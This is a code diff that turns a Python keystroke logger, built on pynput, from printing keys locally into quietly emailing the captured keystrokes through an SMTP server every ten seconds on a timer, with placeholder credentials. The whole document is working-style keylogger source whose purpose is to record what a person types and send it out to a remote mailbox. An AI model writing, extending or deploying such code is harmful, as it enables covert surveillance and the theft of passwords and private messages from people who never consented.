@@ -1,24 +1,42 @@
 import pynput.keyboard as pynput
+import smtplib
+import threading
 
-log = ""
+log = """
+start
+
+"""
 
 def callback_function(key):
-    global log
-
     try:
-        log = log + key.char.encode("utf8")
+        global log
+        log = log + key.char.encode("utf-8")
 
-    except AttributeError:
-        if (key == key.enter):
-            log = log + "\n"
-        elif (key == key.space):
+    except (AttributeError):
+        if (key == key.space):
             log = log + " "
+
         else:
             log = log + str(key)
 
-    print(log)
+def send_mail(email,to_email,password,msg):
+    server = smtplib.SMTP("smtp.live.com",587)
+    server.starttls()
+    server.login(email,password)
+    server.sendmail(email,to_email,msg)
+    server.quit()
 
-keyboard_listener = pynput.Listener(on_press=callback_function)
+def threading_func():
+    global log
+    send_mail("email","to_email","password",log)
+    log = """
+    
+    """
+    timer = threading.Timer(10,threading_func)
+    timer.start()
 
-with keyboard_listener:
-    keyboard_listener.join()
+listener = pynput.Listener(on_press=callback_function)
+
+with listener:
+    threading_func()
+    listener.join()
